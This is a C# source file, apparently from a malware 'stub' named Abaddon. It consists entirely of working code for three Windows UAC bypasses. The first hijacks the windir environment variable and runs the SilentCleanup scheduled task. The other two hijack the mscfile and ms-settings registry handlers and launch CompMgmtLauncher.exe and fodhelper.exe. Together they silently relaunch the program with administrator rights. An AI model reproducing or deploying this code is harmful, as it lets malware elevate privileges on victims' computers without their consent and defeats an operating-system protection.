using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;

namespace AbaddonStub.OptionCode
{
    internal class 管理員代碼
    {
        [DllImport("kernel32.dll")]
        private static extern int WinExec(string exeName, int operType);
        public static bool AdminOrNot()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //UacBypassCode
        public static void Uac()
        {
            if (AdminOrNot()) return;
            try
            {
                new HandleUACbypass();
                if (AdminOrNot()) return;
                new HandleUACbypass2();
                if (AdminOrNot()) return;
                new HandleUACbypass3();
                if (AdminOrNot()) return;
            }
            catch { }
        }

    }

    public class HandleUACbypass
    {
        //Thanks qwqdanchun
        public HandleUACbypass()
        {
            if (管理員代碼.AdminOrNot()) return;
            try
            {
                Microsoft.Win32.RegistryKey key;
                key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
                key.SetValue("windir", @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
                key.Close();

                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                process.Start();
                Environment.Exit(0);
            }
            catch { }
        }
    }

    public class HandleUACbypass2
    {

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);


        public HandleUACbypass2()
        {
            if (管理員代碼.AdminOrNot()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                key.Close();



                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\CompMgmtLauncher.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);

                Thread.Sleep(1000);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }


    }

    public class HandleUACbypass3
    {
        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);

        public HandleUACbypass3()
        {

            if (管理員代碼.AdminOrNot()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                command.SetValue("DelegateExecute", "");
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\fodhelper.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }
    }
}
